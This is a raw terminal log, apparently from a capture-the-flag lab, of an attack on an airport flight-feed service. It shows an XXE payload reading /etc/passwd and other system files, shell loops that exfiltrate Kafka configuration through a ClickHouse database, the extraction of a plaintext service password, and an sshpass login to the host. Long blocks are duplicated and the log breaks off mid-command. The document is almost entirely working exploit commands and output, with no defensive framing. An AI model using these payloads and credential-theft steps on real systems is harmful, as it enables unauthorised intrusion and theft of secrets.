```
om.zaxxer.hikari.util.Credentials:
[password = Yl4aCgh4y2PnU, username = svc_events]




DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -u "$AUTH" --data-binary 'SHOW DATABASES' "$DB"
curl -s -u "$AUTH" --data-binary 'SELECT database, name, engine FROM system.tables FORMAT Pretty' "$DB"



┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -X POST "http://api.htb-airport.htb:8081/feeds/aidx" \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><IATA_AIDX_FlightLegNotifRQ><Originator>LH</Originator><FlightLeg><LegIdentifier><Airline>LH</Airline><FlightNumber>102</FlightNumber><DepartureAirport>FRA</DepartureAirport><ArrivalAirport>MUC</ArrivalAirport><OriginDate>2026-08-20</OriginDate><RepeatNumber>1</RepeatNumber></LegIdentifier><LegData><RemarkFreeText>&xxe;</RemarkFreeText></LegData></FlightLeg></IATA_AIDX_FlightLegNotifRQ>'
{"accepted":true,"topic":"aidx.flightleg.raw.v1"}                                                                                                                                                                                                                                           
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -u "$AUTH" --data-binary \
  'SELECT * FROM partner_feed.flightleg_json ORDER BY ingested DESC LIMIT 1 FORMAT Vertical' "$DB"
Row 1:
──────
transaction_id:     
originator:         
message_type:       IATA_AIDX_FlightLegNotifRQ
version:            
msg_timestamp:      
airline:            LH
flight_number:      102
departure_airport:  FRA
arrival_airport:    MUC
origin_date:        2026-08-20
repeat_number:      1
operational_status: 
event:              {"message_type":"IATA_AIDX_FlightLegNotifRQ","version":null,"timestamp":null,"transaction_id":null,"originator":null,"leg":{"ufi":{"airline":"LH","flight_number":"102","suffix":null,"departure_airport":"FRA","arrival_airport":"MUC","origin_date":"2026-08-20","repeat_number":"1"},"operational_status":null,"times":{},"all_fields":{"LegIdentifier":{"Airline":"LH","FlightNumber":"102","DepartureAirport":"FRA","ArrivalAirport":"MUC","OriginDate":"2026-08-20","RepeatNumber":"1"},"LegData":{"RemarkFreeText":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:101:102::/nonexistent:/usr/sbin/nologin\nsystemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\npollinate:x:102:1::/var/cache/pollinate:/bin/false\npolkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\nsyslog:x:103:104::/nonexistent:/usr/sbin/nologin\nuuidd:x:104:105::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:105:107::/nonexistent:/usr/sbin/nologin\ntss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin\nusbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:109:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:999:988::/var/log/laurel:/bin/false\nsvc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash\nclickhouse:x:996:987::/nonexistent:/bin/false\nmartin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash\ndhcpcd:x:100:65534:DHCP Client 

┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -u "$AUTH" --data-binary \
"SELECT
  ingested,
  JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
FROM partner_feed.flightleg_json
WHERE content != ''
ORDER BY ingested DESC
LIMIT 15
FORMAT Vertical" "$DB"
Row 1:
──────
ingested: 2026-10-16 16:58:05
content:  [Unit]
Description=Terminal Edge Gateway API
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/terminal-api
ExecStart=/usr/lib/jvm/java-25-openjdk-amd64/bin/java -jar /opt/terminal-api/terminal-api-1.0.0.jar
Restart=on-failure
RestartSec=5
SuccessExitStatus=143

[Install]
WantedBy=multi-user.target

Row 2:
──────
ingested: 2026-10-16 16:57:59
content:  [Unit]
Description=Terminal Edge Gateway API
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/terminal-api
ExecStart=/usr/lib/jvm/java-25-openjdk-amd64/bin/java -jar /opt/terminal-api/terminal-api-1.0.0.jar
Restart=on-failure
RestartSec=5
SuccessExitStatus=143

[Install]
WantedBy=multi-user.target

Row 3:
──────
ingested: 2026-10-16 16:51:31
content:  [Unit]
Description=Terminal Edge Gateway API
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/terminal-api
ExecStart=/usr/lib/jvm/java-25-openjdk-amd64/bin/java -jar /opt/terminal-api/terminal-api-1.0.0.jar
Restart=on-failure
RestartSec=5
SuccessExitStatus=143

[Install]
WantedBy=multi-user.target

Row 4:
──────
ingested: 2026-10-16 16:50:07
content:  root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:svc-infra,martin_cole
nogroup:x:65534:
systemd-journal:x:999:
systemd-network:x:998:
systemd-timesync:x:997:
input:x:996:
sgx:x:995:
kvm:x:994:
render:x:993:
lxd:x:101:
messagebus:x:102:
systemd-resolve:x:992:
_ssh:x:103:
polkitd:x:991:
crontab:x:990:
syslog:x:104:
uuidd:x:105:
rdma:x:106:
tcpdump:x:107:
tss:x:108:
landscape:x:109:
fwupd-refresh:x:989:
netdev:x:110:
_laurel:x:988:
svc-infra:x:1000:
clickhouse:x:987:
martin_cole:x:1001:
kafka-data:x:1002:

Row 5:
──────
ingested: 2026-10-16 16:45:35
content:  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false

Row 6:
──────
ingested: 2026-10-16 16:44:38
content:  127.0.0.1 localhost
127.0.1.1 stream

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

Row 7:
──────
ingested: 2026-10-16 16:41:48
content:  test

Row 8:
──────
ingested: 2026-10-16 16:41:42
content:  test

Row 9:
───────
ingested: 2026-10-16 16:40:16
content:  test

Row 10:
───────
ingested: 2026-10-16 16:01:36
content:  127.0.0.1 localhost
127.0.1.1 stream

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

Row 11:
───────
ingested: 2026-10-16 15:55:51
content:  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false

Row 12:
───────
ingested: 2026-08-27 07:28:55
content:  Cancelled due to crew unavailability; passengers rebooked LH106.
                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
```
```
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ for f in \
  /opt/kafka/config/server.properties \
  /opt/kafka/config/kafka_server_jaas.conf \
  /opt/kafka/config/jaas.conf; do

  sed "s|__FILE__|$f|" xxe.xml > payload.xml
  curl -s -X POST "http://api.htb-airport.htb:8081/feeds/aidx" \
    -H "Content-Type: application/xml" \
    --data-binary @payload.xml > /dev/null
  sleep 1

  echo "=== $f ==="
  curl -s -u "$AUTH" --data-binary \
  "SELECT JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
   FROM partner_feed.flightleg_json
   ORDER BY ingested DESC LIMIT 1 FORMAT TSVRaw" "$DB"
  echo -e '\n'
done
=== /opt/kafka/config/server.properties ===



=== /opt/kafka/config/kafka_server_jaas.conf ===



=== /opt/kafka/config/jaas.conf ===



                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ grep SYSTEM payload.xml
<!ENTITY xxe SYSTEM "file:///opt/kafka/config/jaas.conf">
                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

for f in \
  /opt/kafka_2.13-4.3.1/config/server.properties \
  /opt/kafka_2.13-4.3.1/config/kafka_server_jaas.conf \
  /opt/kafka_2.13-4.3.1/config/jaas.conf; do

  sed "s|__FILE__|$f|" xxe.xml > payload.xml

  curl -s -X POST "http://api.htb-airport.htb:8081/feeds/aidx" \
    -H "Content-Type: application/xml" \
    --data-binary @payload.xml > /dev/null

  sleep 1

  echo "=== $f ==="

  curl -s -u "$AUTH" --data-binary \
  "SELECT JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
   FROM partner_feed.flightleg_json
   ORDER BY ingested DESC LIMIT 1 FORMAT TSVRaw" "$DB"

  echo -e '\n'
done
=== /opt/kafka_2.13-4.3.1/config/server.properties ===



=== /opt/kafka_2.13-4.3.1/config/kafka_server_jaas.conf ===



=== /opt/kafka_2.13-4.3.1/config/jaas.conf ===



                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ curl -s -u "$AUTH" --data-binary \
"SELECT JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
 FROM partner_feed.flightleg_json
 WHERE content ILIKE '%PlainLoginModule%'
 ORDER BY ingested DESC LIMIT 1 FORMAT TSVRaw" "$DB" \
| grep -E 'username|password|user_'
  user_svc_infra="Ny2hdpme$bwT3";
                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ 
```

```
                                                                                                                    
┌──(clearlotus㉿kali)-[~/Downloads]
└─$ sshpass -p 'Ny2hdpme$bwT3' ssh -o StrictHostKeyChecking=no svc-infra@10.129.133.37
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Oct 16 05:10:09 PM UTC 2026

  System load:           0.15
  Usage of /:            53.1% of 14.35GB
  Memory usage:          42%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.129.133.37
  IPv6 address for eth0: dead:beef::a0de:adff:fe2e:4c33


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

5 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Oct 16 17:10:10 2026 from 10.10.14.73
svc-infra@stream:~$ 
```


extra cmd line 
```
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -u "$AUTH" --data-binary \
"SELECT
  ingested,
  JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
FROM partner_feed.flightleg_json
WHERE content != ''
ORDER BY ingested DESC
LIMIT 15
FORMAT Vertical" "$DB"
Row 1:
──────
ingested: 2026-10-16 16:58:05
content:  [Unit]
Description=Terminal Edge Gateway API
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/terminal-api
ExecStart=/usr/lib/jvm/java-25-openjdk-amd64/bin/java -jar /opt/terminal-api/terminal-api-1.0.0.jar
Restart=on-failure
RestartSec=5
SuccessExitStatus=143

[Install]
WantedBy=multi-user.target

Row 2:
──────
ingested: 2026-10-16 16:57:59
content:  [Unit]
Description=Terminal Edge Gateway API
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/terminal-api
ExecStart=/usr/lib/jvm/java-25-openjdk-amd64/bin/java -jar /opt/terminal-api/terminal-api-1.0.0.jar
Restart=on-failure
RestartSec=5
SuccessExitStatus=143

[Install]
WantedBy=multi-user.target

Row 3:
──────
ingested: 2026-10-16 16:51:31
content:  [Unit]
Description=Terminal Edge Gateway API
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/terminal-api
ExecStart=/usr/lib/jvm/java-25-openjdk-amd64/bin/java -jar /opt/terminal-api/terminal-api-1.0.0.jar
Restart=on-failure
RestartSec=5
SuccessExitStatus=143

[Install]
WantedBy=multi-user.target

Row 4:
──────
ingested: 2026-10-16 16:50:07
content:  root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:svc-infra,martin_cole
nogroup:x:65534:
systemd-journal:x:999:
systemd-network:x:998:
systemd-timesync:x:997:
input:x:996:
sgx:x:995:
kvm:x:994:
render:x:993:
lxd:x:101:
messagebus:x:102:
systemd-resolve:x:992:
_ssh:x:103:
polkitd:x:991:
crontab:x:990:
syslog:x:104:
uuidd:x:105:
rdma:x:106:
tcpdump:x:107:
tss:x:108:
landscape:x:109:
fwupd-refresh:x:989:
netdev:x:110:
_laurel:x:988:
svc-infra:x:1000:
clickhouse:x:987:
martin_cole:x:1001:
kafka-data:x:1002:

Row 5:
──────
ingested: 2026-10-16 16:45:35
content:  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false

Row 6:
──────
ingested: 2026-10-16 16:44:38
content:  127.0.0.1 localhost
127.0.1.1 stream

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

Row 7:
──────
ingested: 2026-10-16 16:41:48
content:  test

Row 8:
──────
ingested: 2026-10-16 16:41:42
content:  test

Row 9:
───────
ingested: 2026-10-16 16:40:16
content:  test

Row 10:
───────
ingested: 2026-10-16 16:01:36
content:  127.0.0.1 localhost
127.0.1.1 stream

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

Row 11:
───────
ingested: 2026-10-16 15:55:51
content:  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false

Row 12:
───────
ingested: 2026-08-27 07:28:55
content:  Cancelled due to crew unavailability; passengers rebooked LH106.
                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

for f in \
  /etc/systemd/system/kafka.service \
  /lib/systemd/system/kafka.service \
  /usr/lib/systemd/system/kafka.service \
  /etc/systemd/system/kafka-server.service \
  /lib/systemd/system/kafka-server.service \
  /usr/lib/systemd/system/kafka-server.service; do

  sed "s|__FILE__|$f|" xxe.xml > payload.xml

  curl -s -X POST "http://api.htb-airport.htb:8081/feeds/aidx" \
    -H "Content-Type: application/xml" \
    --data-binary @payload.xml > /dev/null

  sleep 1

  echo "=== $f ==="
  curl -s -u "$AUTH" --data-binary \
  "SELECT JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
   FROM partner_feed.flightleg_json
   ORDER BY ingested DESC LIMIT 1 FORMAT TSVRaw" "$DB"
  echo -e '\n'
done
=== /etc/systemd/system/kafka.service ===



=== /lib/systemd/system/kafka.service ===



=== /usr/lib/systemd/system/kafka.service ===



=== /etc/systemd/system/kafka-server.service ===



=== /lib/systemd/system/kafka-server.service ===



=== /usr/lib/systemd/system/kafka-server.service ===
[Unit]
Description=Apache Kafka Distributed Message Broker
Documentation=https://apache.org
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
SupplementaryGroups=kafka-data
WorkingDirectory=/opt/kafka_2.13-4.3.1
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
ExecStop=/opt/kafka_2.13-4.3.1/bin/kafka-server-stop.sh
Restart=on-failure
RestartSec=10s

[Install]
WantedBy=multi-user.target


                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ for f in \
  /opt/kafka/config/server.properties \
  /opt/kafka/config/kafka_server_jaas.conf \
  /opt/kafka/config/jaas.conf; do

  sed "s|__FILE__|$f|" xxe.xml > payload.xml
  curl -s -X POST "http://api.htb-airport.htb:8081/feeds/aidx" \
    -H "Content-Type: application/xml" \
    --data-binary @payload.xml > /dev/null
  sleep 1

  echo "=== $f ==="
  curl -s -u "$AUTH" --data-binary \
  "SELECT JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
   FROM partner_feed.flightleg_json
   ORDER BY ingested DESC LIMIT 1 FORMAT TSVRaw" "$DB"
  echo -e '\n'
done
=== /opt/kafka/config/server.properties ===



=== /opt/kafka/config/kafka_server_jaas.conf ===



=== /opt/kafka/config/jaas.conf ===



                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ grep SYSTEM payload.xml
<!ENTITY xxe SYSTEM "file:///opt/kafka/config/jaas.conf">
                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

for f in \
  /opt/kafka_2.13-4.3.1/config/server.properties \
  /opt/kafka_2.13-4.3.1/config/kafka_server_jaas.conf \
  /opt/kafka_2.13-4.3.1/config/jaas.conf; do

  sed "s|__FILE__|$f|" xxe.xml > payload.xml

  curl -s -X POST "http://api.htb-airport.htb:8081/feeds/aidx" \
    -H "Content-Type: application/xml" \
    --data-binary @payload.xml > /dev/null

  sleep 1

  echo "=== $f ==="

  curl -s -u "$AUTH" --data-binary \
  "SELECT JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
   FROM partner_feed.flightleg_json
   ORDER BY ingested DESC LIMIT 1 FORMAT TSVRaw" "$DB"

  echo -e '\n'
done
=== /opt/kafka_2.13-4.3.1/config/server.properties ===



=== /opt/kafka_2.13-4.3.1/config/kafka_server_jaas.conf ===



=== /opt/kafka_2.13-4.3.1/config/jaas.conf ===



                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ curl -s -u "$AUTH" --data-binary \
